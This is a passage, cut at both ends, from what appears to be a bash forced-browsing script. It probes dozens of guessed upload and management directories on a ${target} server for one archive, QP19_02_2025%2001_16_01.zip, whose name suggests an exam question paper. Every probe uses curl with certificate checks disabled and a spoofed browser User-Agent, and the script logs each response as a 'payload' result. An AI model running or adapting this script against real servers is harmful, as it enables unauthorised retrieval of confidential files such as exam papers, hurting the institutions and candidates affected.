${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops_QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPServiceBatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPServiceBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPServiceBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingBatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_BulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management_QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload-QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFileDataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFileDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFileDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileDataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchMassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload_QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService-QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor-QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SyncQPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SyncQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SyncQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl-QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow_ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemBulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuiteQPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
